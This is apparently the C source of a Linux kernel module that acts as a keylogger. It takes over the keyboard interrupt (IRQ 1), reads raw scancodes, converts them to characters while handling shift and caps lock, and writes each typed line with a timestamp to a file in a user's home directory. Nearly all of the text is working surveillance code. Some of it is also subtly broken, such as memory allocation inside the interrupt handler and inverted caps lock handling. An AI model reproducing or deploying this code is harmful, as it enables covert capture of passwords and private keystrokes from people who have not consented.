#include <linux/init.h> 
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <asm/io.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include<linux/slab.h> 
#include<linux/socket.h>
#include<linux/in.h> 
#include<net/sock.h> 
#include<linux/file.h>
#include<linux/net.h> 
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include<linux/slab.h>
#include <asm/uaccess.h>
#include<linux/net.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include<linux/seq_file.h>
#include <linux/ktime.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>



char USER_TIME[11]="###:##:###";
char dates[11]="##:##:####"; 
char times[11]="##:##:####"; 
char datetime[100]="##:##:####";

static char buff[250]="";
static char buff2[250]="";

static struct file *fp = NULL;


static struct workqueue_struct *my_workqueue;

typedef struct {
  struct work_struct my_work;
  int    x;
unsigned char scancode;
} my_work_t;
my_work_t *work;

#define MY_WORK_QUEUE_NAME "WQsched.c"

void print_time(char char_time[]);
void print_time(char []);

struct timespec my_tv;

const char *timing[]={"","\n"};
//int size;



static const char *keys[] =
{
   	"<Nothing>",//0	
	"<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9",//1-10
 	"0","-", "=", "^H","<TAB>", "q", "w", "e", "r", "t", //11-20
	"y", "u", "i","o", "p", "[", "]","<ENTER>","<L_CTRL>","a",//21-30
	"s", "d", "f", "g", "h","j", "k", "l", ";", "'",//31-40
	"`","<L_SHIFT>","\\","z", "x", "c", "v", "b", "n", "m",//41-50
	",", ".", "/", "<R_SHIFT>","*","<Left_Alt>"," ","<CapsLock>"//51-58
};



static const char *shifted_keys[] =
{
    	"<Nothing>",//0
	"<ESC>", "!", "@", "#", "$", "%", "^", "&", "*", "(",//1-10
	")","_", "+", "^H","<TAB>", "Q", "W", "E", "R", "T", //11-20
	"Y", "U", "I","O", "P", "{", "}","<ENTER>","<L_CTRL>","A",//21-30
	"S", "D", "F", "G", "H","J", "K", "L", ":", "\"",//31-40
	"~","<L_SHIFT>","|","Z", "X", "C", "V", "B", "N", "M",//41-50
	"<", ">", "?", "<R_SHIFT>","*","<Left Alt>"," ","<CapsLock>"//51-58
};




static const char *cap_keys[] =
{
    	"<Nothing>", //0						
	"<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9",//1-10
	"0","-", "=", "^H","<TAB>", "Q", "W", "E", "R", "T", //11-20
	"Y", "U", "I","O", "P", "[", "]","<ENTER>","<L_CTRL>","A",//21-30
	"S", "D", "F", "G", "H","J", "K", "L", ";", "'",//31-40
	"`","<L_SHIFT>","\\","Z", "X", "C", "V", "B", "N", "M", //41-50
	",", ".", "/", "<R_SHIFT>","*","<Left Alt>"," ","<CapsLock>"//51-58
};





struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_fs());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int file_write(struct file *file, unsigned long long offset, const char *data[], unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_fs());

    ret = vfs_write(file, *data, size, &offset);

    set_fs(oldfs);
    return ret;
}


int file_sync(struct file *file) 
{
    vfs_fsync(file, 0);
    return 0;
}




void print_time(char char_time[])
{
	struct timespec my_tv;
	int sec, hr, min, tmp1, tmp2;
	int days,years,days_past_currentyear;
	
	int i=0,month=0,date=0;
	unsigned long get_time;
	char char_time2[11];

	size_t destination_size = sizeof (char_time2);

	strncpy(char_time2, char_time, destination_size);
	char_time2[destination_size - 1] = '\0';

	

	getnstimeofday(&my_tv);
	get_time = my_tv.tv_sec;
	get_time = get_time + 43200;

	sec = get_time % 60;
	tmp1 = get_time / 60;
	min = tmp1 % 60;
	tmp2 = tmp1 / 60;
	hr = (tmp2+4) % 24;
	hr=hr+1;
	

	char_time2[1]=(hr/10)+48;
	char_time2[2]=(hr%10)+48;
	char_time2[4]=(min/10)+48;
	char_time2[5]=(min%10)+48;
	char_time2[7]=(sec/10)+48;
	char_time2[8]=(sec%10)+48;
	char_time2[10]='\0';

	days = (tmp2+4)/24;
	days_past_currentyear = days % 365;
	years = days / 365;
	
	for(i=1970;i<=(1970+years);i++)
	{
			if ((i % 4) == 0)
				days_past_currentyear--;
	}
	if((1970+years % 4) != 0)
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1;
			date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 59)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}
		else if (days_past_currentyear >59 && days_past_currentyear <= 90)
		{
			month = 3;
			date = days_past_currentyear - 59;
		}
		else if (days_past_currentyear >90 && days_past_currentyear <= 120)
		{
			month = 4;
			date = days_past_currentyear - 90;
		}
		else if (days_past_currentyear >120 && days_past_currentyear <= 151)
		{
			month = 5;
			date = days_past_currentyear - 120;
		}
		else if (days_past_currentyear >151 && days_past_currentyear <= 181)
		{
			month = 6;
			date = days_past_currentyear - 151;
		}
		else if (days_past_currentyear >181 && days_past_currentyear <= 212)
		{
			month = 7;
			date = days_past_currentyear - 181;
		}
		else if (days_past_currentyear >212 && days_past_currentyear <= 243)
		{
			month = 8;
			date = days_past_currentyear - 212;
		}
		else if (days_past_currentyear >243 && days_past_currentyear <= 273)
		{
			month = 9;
			date = days_past_currentyear - 243;
		}
		else if (days_past_currentyear >273 && days_past_currentyear <= 304)
		{
			month = 10;
			date = days_past_currentyear - 273;
		}
		else if (days_past_currentyear >304 && days_past_currentyear <= 334)
		{
			month = 11;
			date = days_past_currentyear - 304;
		}
		else if (days_past_currentyear >334 && days_past_currentyear <= 365)
		{
			month = 12;
			date = days_past_currentyear - 334;
		}
		printk(KERN_INFO "Date: %d.%d.%d \t Time: %d:%d:%d\n",month,date,(1970+years),(hr-1),min,sec);
		

	}	
	else
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1;
			date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 60)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}
		else if (days_past_currentyear >60 && days_past_currentyear <= 91)
		{
			month = 3;
			date = days_past_currentyear - 60;
		}
		else if (days_past_currentyear >91 && days_past_currentyear <= 121)
		{
			month = 4;
			date = days_past_currentyear - 91;
		}
		else if (days_past_currentyear >121 && days_past_currentyear <= 152)
		{
			month = 5;
			date = days_past_currentyear - 121;
		}
		else if (days_past_currentyear >152 && days_past_currentyear <= 182)
		{
			month = 6;
			date = days_past_currentyear - 152;
		}
		else if (days_past_currentyear >182 && days_past_currentyear <= 213)
		{
			month = 7;
			date = days_past_currentyear - 182;
		}
		else if (days_past_currentyear >213 && days_past_currentyear <= 244)
		{
			month = 8;
			date = days_past_currentyear - 213;
		}
		else if (days_past_currentyear >244 && days_past_currentyear <= 274)
		{
			month = 9;
			date = days_past_currentyear - 244;
		}
		else if (days_past_currentyear >274 && days_past_currentyear <= 305)
		{
			month = 10;
			date = days_past_currentyear - 274;
		}
		else if (days_past_currentyear >305 && days_past_currentyear <= 335)
		{
			month = 11;
			date = days_past_currentyear - 305;
		}
		else if (days_past_currentyear >335 && days_past_currentyear <= 366)
		{
			month = 12;
			date = days_past_currentyear - 335;
		}
		printk(KERN_INFO "Date:%d.%d.%d \t Time:  %d:%d:%d \t",month,date,(1970+years),(hr-1),min,sec);
	
		


	}

	dates[0]=(month/10)+48; 
	dates[1]=(month%10)+48;  
	dates[3]=(date/10)+48;                 
	dates[4]=(date%10)+48;                
	tmp1 = ((1970+years) % 10) + 48;                 
	dates[9]= tmp1;             
	tmp1 = (1970+years)/ 10;     
	tmp2 = tmp1 % 10;            
	dates[8]= tmp2 + 48;      
	tmp1 = tmp1 / 10;        
	tmp2 = tmp1 % 10;         
	dates[7]=tmp2 + 48;  
	tmp1 = tmp1 / 10;    
	dates[6]= tmp1+48;  
	
	strcpy(datetime,"Date: ");
	strcat(datetime,dates);

	times[0]=((hr-1)/10)+48; 
	times[1]=((hr-1)%10)+48;  
	times[3]=(min/10)+48;                 
	times[4]=(min%10)+48;                                
	times[6]=(sec/10)+48;                 
	times[7]=(sec%10)+48;              
	times[8]='\0';

	strcat(datetime,"   Time: ");
	strcat(datetime,times) ;
	timing[0]=datetime;


		

}








static void got_char(struct work_struct *my_work) 

{

	int len;

 	my_work_t *work = (my_work_t *)my_work;

        int scancode = (int)(work->scancode) & 0x7F;
  	char released = (work->scancode) & 0x80  ? 1 : 0;

  	static int caps_lock  = 0;
	static int shift_val = 0;

  

  if (scancode < 112) 
{


	if(!released && (scancode==0x2a || scancode==0x36))
	{
		shift_val = 1;
	}
	
	else if (released && (scancode==0x2a || scancode==0x36)) 
	{
		shift_val = 0;


	}


	if (shift_val == 1)
	{
    		if (!released) 
		{ 
		printk(KERN_INFO "Key  %s Pressed . Scancode : %x",shifted_keys[scancode], scancode);
		print_time(USER_TIME);
		printk("\n");
			if(!(scancode == 0x3a)&&!(scancode==0x2a || scancode==0x36))
			{
			if(caps_lock==0)
			strcat(buff,shifted_keys[scancode]);
			else
			strcat(buff,keys[scancode]);


			if(scancode ==0x1c){
			
			strcat(buff2, timing[0]);
			strcat(buff2,"\t");
			strcat(buff2, buff);
			strcat(buff2,"\n");

			len= strlen(buff2);
			timing[0]=buff2;
			file_write(fp,0, &timing[0], len);

			timing[0]="";
			buff[0]='\0';
			buff2[0]='\0';}	

		}
		}


	}

	else 
   	{
	  if (released) 
	  {

		if(scancode == 0x3a)
		{

			if (caps_lock == 0) 
			{
				caps_lock = 1;
			}

			else if (caps_lock == 1)
			{
				caps_lock = 0;
			}
		}

		 if (caps_lock == 1) 
		 {
			
			printk(KERN_INFO "Key  %s Pressed . Scancode : %x \n",cap_keys[scancode],scancode);
			print_time(USER_TIME);
			printk("\n");
			if(!(scancode == 0x3a)&&!(scancode==0x2a || scancode==0x36))
			{
			if(shift_val==0)
			strcat(buff,shifted_keys[scancode]);
			else
			strcat(buff,keys[scancode]);
			
			if(scancode ==0x1c){
			
			strcat(buff2, timing[0]);
			strcat(buff2,"\t");
			strcat(buff2, buff);
			strcat(buff2,"\n");

			len= strlen(buff2);
			timing[0]=buff2;
			file_write(fp,0, &timing[0], len);
			timing[0]="";
			buff[0]='\0';
			buff2[0]='\0';}	
			}


		  } 
		  else if (caps_lock == 0)
		  {

			printk(KERN_INFO "Key  %s Pressed . Scancode : %x \n",keys[scancode],scancode);
			print_time(USER_TIME);
			printk("\n");

			if(!(scancode == 0x3a)&&!(scancode==0x2a || scancode==0x36))
			{
			if(shift_val==0)
			strcat(buff,keys[scancode]);
			else
			strcat(buff,shifted_keys[scancode]);

			if(scancode ==0x1c){
			
			strcat(buff2, timing[0]);
			strcat(buff2,"\t");
			strcat(buff2, buff);
			strcat(buff2,"\n");

			len= strlen(buff2);
			timing[0]=buff2;
			file_write(fp,0, &timing[0], len);
			timing[0]="";
			buff[0]='\0';
			buff2[0]='\0';}		
;
		}

		  }

		else if (released && (scancode==0x2a || scancode==0x36)) 
		{
		 
			printk(KERN_INFO "Key  %s Released . Scancode : %x \n",shifted_keys[scancode], scancode);
			print_time(USER_TIME);
			printk("\n");
		
		}


	  }

       }
  }
}






irqreturn_t irq_handler(int irq, void *dev_id)
{
	static unsigned char scancode;
	scancode = inb(0x60);

	work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);

	INIT_WORK((struct work_struct *)work, got_char);

	work->scancode = scancode;

	queue_work(my_workqueue, (struct work_struct *)work);

	return IRQ_HANDLED;
}




int init_module()
{
	char *filename = "/home/sirish/Documents/logger6/test";
 	fp = file_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
	
	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
	
	free_irq(1, NULL);
	

	return request_irq(1,irq_handler,IRQF_SHARED, "test_keyboard_irq_handler",(void *)(irq_handler));
}

void cleanup_module()
{
	free_irq(1, NULL);
}
MODULE_LICENSE("GPL");
